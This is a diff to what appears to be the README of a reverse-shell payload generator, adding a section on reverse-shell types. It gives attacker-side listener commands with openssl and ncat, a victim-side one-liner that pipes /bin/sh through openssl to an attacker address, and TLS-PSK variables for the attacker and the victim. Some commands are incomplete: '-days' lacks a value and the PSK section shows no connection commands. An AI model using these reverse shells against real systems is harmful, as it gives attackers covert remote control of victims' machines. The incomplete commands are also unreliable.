@@ -48,6 +48,34 @@ After that the application will craft that with the specified parameters and out
 
 Use the payload generated to execute that in the target machine. You will need to previously have a listener in that IP and PORT you specified when creating the payload. In most cases a simple netcat will do the trick: `nc -l -p <port>`
 
+
+## Reverse Shell types and how they work: 
+
+In most cases `ncat` or `nc` will work but in some cases you will need to setup some stuff before being able to accept an incomming connection with some revshell types. 
+
+### OpenSSL
+```
+user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days
+user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port <port>
+```
+or
+```
+user@attack$ ncat --ssl -vv -l -p <port>
+user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ip>:<port> /tmp/s; rm /tmp/s
+```
+TLS-PSK (does not rely on PKI or self-signed certificates)
+```
+openssl rand -hex 48
+
+
+# server (attacker)
+export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpsk"
+
+# client (victim)
+export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpsk"
+```
+
+
 ## Some more information
 
 In the root of the repository you can find the following files: 
